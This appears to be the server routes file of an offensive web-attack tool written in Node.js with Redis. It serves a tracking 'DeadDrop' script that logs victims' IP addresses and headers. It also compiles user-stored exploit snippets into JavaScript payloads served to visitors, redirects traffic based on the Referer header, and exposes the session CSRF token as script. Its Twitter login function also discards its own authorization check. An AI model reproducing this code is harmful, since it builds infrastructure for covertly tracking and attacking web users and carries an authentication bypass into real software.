var config = require('../config'),
    redis = require('redis'),
    async = require('async'),
    stitch = require('stitch'),
    fs = require('fs'),
    uuid = require('node-uuid'),
    _ = require('underscore'),
    crypto = require('crypto'),
    client = redis.createClient(config.thoonk.port, config.thoonk.host);

redis.debug_mode = config.redis_debug_mode || false;

var scripts = {};

// Read for later use in payloads
var ddclient = fs.readFileSync('public/js/ddclient.js', 'utf8');

// add trim here cause I'm lazy
String.prototype.trim = function () {
    return this.replace(/^\s*/, "").replace(/\s*$/, "");
}


// Read in and cache lua scripts
fs.readdir(config.scriptdir, function (err, files) {
    if (err) {
        config.logger.error(err);
    } else {
        async.forEach(files, function (file, cb) {
            fs.readFile(config.scriptdir + "/" + file, function (err, data) {
                if (err) {
                    config.logger.error(err);
                } else {
                    scripts[file.split('.')[0]] = data;
                    cb();
                }
            });
        });
    }
});

// Exploit Client Package
var deps = __dirname + '/../lib';

var clientPackage = stitch.createPackage({
    dependencies: [
        deps + '/client/json2.js',
        deps + '/client/jquery.min.js',
        deps + '/exploitclient/client.js'
    ]
});


exports.index = function (req, res) {
    res.render('index', { title: '' });
};

exports.logout = function (req, res) {
    req.session.destroy();
    res.redirect('/');
};

// User Profile
exports.updateUserProfile = function (req, res) {
    client.eval(scripts.updateUserProfile, 0, JSON.stringify(req.user), JSON.stringify(req.body), function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            req.session.profile = args[1];
            res.send(args[1], args[2]);
        }
    });
};

// Redirects
exports.createRedirect = function (req, res) {
    client.eval(scripts.createRedirect, 0, JSON.stringify(req.user), req.body.referer.trim(), req.body.url.trim(), function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.send(args[1], args[2]);
        }
    });
};

exports.getUserRedirects = function (req, res) {
    res.render('redirects', {
        title: 'Referer Redirects'
    });
};

exports.getUserRedirectsJSON = function (req, res) {
    client.eval(scripts.getUserRedirects, 0, JSON.stringify(req.user), function (err, reply) {
        var args = _.toArray(reply);
        res.send(args[1], {'Content-Type': 'application/json'}, 200);
    });
};

exports.deleteRedirect = function (req, res) {
    client.eval(scripts.deleteRedirect, 0, JSON.stringify(req.user), req.body.referer, req.body.url, function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.send(args[1], args[2]);
        }
    });
};

// *********** DEADDROP ROUTES ***********

exports.createDeadDrop = function (req, res) {
    var time = new Date();
    if (req.query.key && req.query.location && req.query.type) {
        client.eval(scripts.createDeadDrop, 0, req.query.key, req.query.location, req.query.type, time, function (err, reply) {
            res.header('Access-Control-Allow-Origin', '*');
            res.header('Access-Control-Allow-Credentials', true);
            res.header('Access-Control-Allow-Methods', 'POST, GET, PUT, DELETE, OPTIONS');
            res.header('Access-Control-Allow-Headers', 'Content-Type');
            res.header("Access-Control-Allow-Headers", "X-Requested-With");

            var args = _.toArray(reply);
            if (args[0]) {
                res.send(args[0], args[2]);
            } else {
                res.send(args[1], args[2]);
            }
        });
    } else {
        res.send('ahhhh no', 400);
    }
};

exports.deleteDeadDrop = function (req, res) {
    if (req.params.id) {
        client.eval(scripts.deleteDeadDrop, 0, JSON.stringify(req.user), req.params.id, function (err, reply) {
            console.log(reply);
            var args = _.toArray(reply);
            if (args[0]) {
                res.send(args[0], args[2]);
            } else {
                res.send(args[1], args[2]);
            } 
        });
    } else {
        res.send('ahhhh no', 418); 
    }
};

exports.getDeadDropLocations = function (req, res) {
    client.eval(scripts.getDeadDrops, 0, JSON.stringify(req.user), function (err, reply) {
        var args = _.toArray(reply);
        var jsonreply;
        if (args[0]) {
            jsonreply = {count: 0, total: 0, deaddrops: []};
        } else {
            jsonreply = JSON.parse(args[1]);
        }
        res.render('deaddrop.jade', {
            locals: {
                title: "DeadDrop Explorer",
                events: jsonreply.deaddrops,
                count: jsonreply.count,
                total: jsonreply.total
            }
        });
    });
};


// Get dead Drop client
exports.getDeadDropClient = function (req, res) {
    var id = req.params[0];
    var c = ddclient.toString().replace('{{id}}', id);
    var time = Math.round((new Date()).getTime() / 1000);
    var eventDetails = {};
    eventDetails.sourceIP = req.connection.remoteAddress; 
    eventDetails.headers = req.headers;
    client.eval(scripts.addDeadDropEvent, 0, id, JSON.stringify(eventDetails), uuid(), time, function (err, reply) {
        if (reply) {
            res.header('Content-Type', 'application/javascript');
            res.send(c);
        } else {
            res.send("nope, chuck testa", 418); 
        }
    });
};

exports.addDeadDropEvent = function (req, res) {
    var id = req.params[0];
    var time = Math.round((new Date()).getTime() / 1000);
    var eventDetails = req.body;
    res.header('Access-Control-Allow-Origin', '*');
    eventDetails.sourceIP = req.connection.remoteAddress;
    eventDetails.headers = req.headers;
    console.log(JSON.stringify(eventDetails));
    client.eval(scripts.addDeadDropEvent, 0, id, JSON.stringify(eventDetails), uuid(), time, function (err, reply) {
        res.send("", 204);
    });
};

exports.getDeadDropIntel = function (req, res) {
    var id = req.params[0];
    client.eval(scripts.getDeadDropEvents, 0, id, JSON.stringify(req.user), function (err, reply) {
        var args = _.toArray(reply);
        res.render('deaddrop_intel.jade', {
            locals: {
                title: "DeadDrop Explorer",
                error: args[0],
                intel: JSON.parse(args[1])
            }
        });
    });
};

// *********** SNIPPET ROUTES ************

exports.snippetManager = function (req, res) {
    res.render('snippet.jade', {
        locals: {
            title: "Snippet Manager"
        }
    });
};

exports.getSnippets = function (req, res) {
    client.eval(scripts.getSnippets, 0, JSON.stringify(req.user), function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.send(args[1], args[2]);
        }
    });
};

exports.postSnippets = function (req, res) {
    if (req.body.hasOwnProperty('id') && req.body.id === '') {
        // Creating
        client.eval(scripts.createSnippet, 0, JSON.stringify(req.user), uuid(), JSON.stringify(req.body), function (err, reply) {
            var args = _.toArray(reply);
            if (args[0]) {
                res.send(args[0], args[2]);
            } else {
                res.send(args[1], args[2]);
            }
        });
    } else {
        // Updating
        client.eval(scripts.updateSnippet, 0, JSON.stringify(req.user), JSON.stringify(req.body), function (err, reply) {
            var args = _.toArray(reply);
            if (args[0]) {
                res.send(args[0], args[2]);
            } else {
                res.header('Content-Type', 'text/plain');
                res.send(args[1], args[2]);
            }
        });
    }
};

exports.deleteSnippet = function (req, res) {
    client.eval(scripts.deleteSnippet, 0, JSON.stringify(req.user), JSON.stringify(req.body), function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.send(args[1], args[2]);
        }
    });
};

// ******* END SNIPPET ROUTES ********

// ******* EXPLOIT ROUTES ********
exports.addExploit = function (req, res) {
    var id = req.query.id || '';
    res.render('exploit_add.jade', {
        locals: {
            title: "Exploit Add",
            id: id
        }
    });
};

exports.listExploits = function (req, res) {
    res.render('exploit_list.jade', {
        locals: {
            title: "Exploit List"
        }
    });
};

exports.createExploit = function (req, res) {
    var id = req.body.id || uuid();
    
    client.eval(scripts.createExploit, 0, JSON.stringify(req.user), id, JSON.stringify(req.body), function (err, reply) {
        res.header('Content-Type', 'text/plain');
        res.send(id, 200);
    });   
};

exports.getExploit = function (req, res) {
    res.header('content-type', 'text/javascript');
    clientPackage.compile(function (err, source) {
        var id = req.params[0];
        client.eval(scripts.getExploitJSON, 0, id, function (err, reply) {
            var args = _.toArray(reply);

            // It probably isn't a good idea to build the client this way but it works and it's fast
            var funcs = "var funcs = [";
            async.forEachSeries(JSON.parse(args[1]).exploit, function (item, callback) {
                funcs = funcs + item.code + ',';
                callback();
            }, function (err) {
                funcs = funcs + '];';

                source = funcs + " var exploitJSON =" + JSON.stringify(args[1]) + ";\n" + source;
                res.send(source);
            });
        });
    });
};

exports.getExploitJSON = function (req, res) {
    var id = req.params[0];
    client.eval(scripts.getExploitJSON, 0, id, function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.header('Content-Type', 'application/json');
            res.send(args[1], args[2]);
        }    
    });
};

exports.getExploitsJSON = function (req, res) {
    client.eval(scripts.getExploits, 0, JSON.stringify(req.user), function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.header('Content-Type', 'application/json');
            res.send(args[1], args[2]);
        }    
    });
};

exports.deleteExploit = function (req, res) {
    var id = req.params.id;
    client.eval(scripts.deleteExploit, 0, JSON.stringify(req.user), id, function (err, reply) {
        var args = _.toArray(reply);
        if (args[0]) {
            res.send(args[0], args[2]);
        } else {
            res.send(args[1], args[2]);
        }
    }); 
};

// **** Other stuff, it probably shouldn't be here, but what the hell
exports.findOrCreateUserByTwitterData = function (twitterUserData, cb) {
    client.sismember('authorized', twitterUserData.username, function (err, reply) {
        var reply = twitterUserData.username;
        if (reply) {
            // Try and find user
            client.get("USER:" + twitterUserData.id, function (err, reply) {
                if (err) {
                    cb(err);
                }
                if (reply) {
                    client.get("USER:" + twitterUserData.id + ":APIKEY", function (err, key) {
                        client.get("USER:" + twitterUserData.id + ":PROFILE", function (err, profile) {
                            if (profile) {
                                twitterUserData.profile = JSON.parse(profile);
                            } else {
                                twitterUserData.profile = {};
                            }
                            // Update with the users latest twitter infoz if we can.
                            client.set("USER:" + twitterUserData.id, JSON.stringify(twitterUserData), function (err, setReply) {
                                if (setReply) {
                                    twitterUserData.apikey = key;
                                    cb(null, twitterUserData);
                                } else {
                                    reply.apikey = key;
                                    cb(null, reply);
                                }
                            });
                        });
                    });
                } else {
                    // Create / Save User
                    client.set("USER:" + twitterUserData.id, JSON.stringify(twitterUserData), function (err, reply) {
                        if (!err && reply) {
                            // Add user API key
                            crypto.randomBytes(16, function (ex, buf) {
                                var key = buf.toString('hex');
                                client.set("APIKEY:" + key, 'USER:' + twitterUserData.id, function (err, reply) {
                                    client.set("USER:" + twitterUserData.id + ":APIKEY", key, function (err, reply) {
                                        twitterUserData.apikey = key;
                                        cb(null, twitterUserData);
                                    });
                                });
                            });
                        } else {
                            cb(err);
                        }
                    });
                }
            });
        } else {
            config.logger.error("not in authorized list");
            cb(null, null);
        }
    });
};


exports.checkRefererMiddleware = function () {
    return function (req, res, next)  {
        console.log("REFERER:" + req.headers.referer + "|");
        if (req.headers.referer) {
            client.eval(scripts.redirect, 0, req.headers.referer, function (err, reply) {
                console.log("REPLY: " + reply);
                if (reply) {
                    res.redirect(reply);
                } else {
                    next();
                }
            });
        } else {
            next();
        }
    };
};


exports.csrfToken = function (req, res) {
    res.header('Content-Type', 'text/javascript');
    res.send('csrf_token=' + '"' + req.session._csrf + '";');
};
